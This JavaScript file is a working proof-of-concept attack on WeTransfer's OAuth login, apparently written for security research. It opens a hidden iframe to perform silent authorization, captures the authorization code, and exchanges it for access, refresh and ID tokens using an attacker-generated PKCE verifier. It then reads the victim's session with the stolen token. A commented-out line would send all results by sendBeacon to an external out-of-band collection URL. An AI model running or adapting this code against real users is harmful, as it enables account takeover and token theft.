const EXFIL_URL = 'https://0jik82y5uzt15l0l8n1yaw137185g83b0.oast.site/exfil';

(async () => {
  const results = { attack: 'auth_code_theft', domain: document.domain, ts: Date.now() };

  // Generate PKCE pair (attacker-controlled)
  const codeVerifier = Array.from(crypto.getRandomValues(new Uint8Array(32)), b => b.toString(16).padStart(2, '0')).join('');
  const codeChallenge = btoa(String.fromCharCode(...new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(codeVerifier))))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  const state = Array.from(crypto.getRandomValues(new Uint8Array(32)), b => b.toString(16).padStart(2, '0')).join('');

  results.pkce = { code_verifier: codeVerifier, code_challenge: codeChallenge, state: state };

  try {
    // Step 1: Create hidden iframe for silent auth
    const code = await new Promise((resolve, reject) => {
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';

      const params = new URLSearchParams({
        response_mode: 'web_message',
        prompt: 'none',
        client_id: 'dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc',
        response_type: 'code',
        redirect_uri: 'https://wetransfer.com/account/silent-callback',
        code_challenge: codeChallenge,
        code_challenge_method: 'S256',
        state: state
      });
      iframe.src = 'https://auth.wetransfer.com/authorize?' + params.toString();

      iframe.addEventListener('load', () => {
        try {
          // Same-origin: read the redirected URL containing the code
          const url = iframe.contentWindow.location.href;
          const urlParams = new URLSearchParams(new URL(url).search);
          resolve(urlParams.get('code'));
        } catch (e) {
          reject(e);
        }
      });

      document.body.appendChild(iframe);
      setTimeout(() => reject(new Error('timeout')), 10000);
    });

    results.auth_code = code;

    // Step 2: Exchange code for tokens using our code_verifier
    if (code) {
      const tokenResp = await fetch('https://auth.wetransfer.com/oauth/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          grant_type: 'authorization_code',
          client_id: 'dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc',
          code: code,
          code_verifier: codeVerifier,
          redirect_uri: 'https://wetransfer.com/account/silent-callback'
        })
      });
      const tokenData = await tokenResp.json();
      results.token = { status: tokenResp.status, access_token: tokenData.access_token, refresh_token: tokenData.refresh_token, id_token: tokenData.id_token };

      // Step 3: Read victim account with stolen token
      if (tokenData.access_token) {
        const sessionResp = await fetch('/api/v4/auth/session', {
          headers: { 'Authorization': 'Bearer ' + tokenData.access_token }
        });
        results.session = { status: sessionResp.status, body: await sessionResp.json() };
      }
      document.writeln('<pre>' + JSON.stringify(results, null, 2) + '</pre>');
    }
  } catch (e) {
    results.error = e.message;
  }

  // Exfiltrate
//   navigator.sendBeacon(EXFIL_URL, JSON.stringify(results));
})();
